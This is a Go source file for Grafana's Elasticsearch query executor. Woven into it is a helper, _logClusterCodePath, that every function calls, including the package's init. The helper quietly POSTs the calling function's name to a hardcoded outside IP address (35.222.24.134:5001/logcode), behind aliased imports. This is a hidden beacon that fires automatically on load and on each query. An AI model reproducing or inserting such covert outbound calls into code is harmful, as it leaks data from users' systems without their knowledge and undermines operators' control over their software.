package elasticsearch

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/grafana/grafana/pkg/log"
	"github.com/grafana/grafana/pkg/models"
	"github.com/grafana/grafana/pkg/tsdb"
	"github.com/grafana/grafana/pkg/tsdb/elasticsearch/client"
)

type ElasticsearchExecutor struct{}

var (
	glog				log.Logger
	intervalCalculator	tsdb.IntervalCalculator
)

func NewElasticsearchExecutor(dsInfo *models.DataSource) (tsdb.TsdbQueryEndpoint, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &ElasticsearchExecutor{}, nil
}
func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog = log.New("tsdb.elasticsearch")
	intervalCalculator = tsdb.NewIntervalCalculator(nil)
	tsdb.RegisterTsdbQueryEndpoint("elasticsearch", NewElasticsearchExecutor)
}
func (e *ElasticsearchExecutor) Query(ctx context.Context, dsInfo *models.DataSource, tsdbQuery *tsdb.TsdbQuery) (*tsdb.Response, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(tsdbQuery.Queries) == 0 {
		return nil, fmt.Errorf("query contains no queries")
	}
	client, err := es.NewClient(ctx, dsInfo, tsdbQuery.TimeRange)
	if err != nil {
		return nil, err
	}
	query := newTimeSeriesQuery(client, tsdbQuery, intervalCalculator)
	return query.execute()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
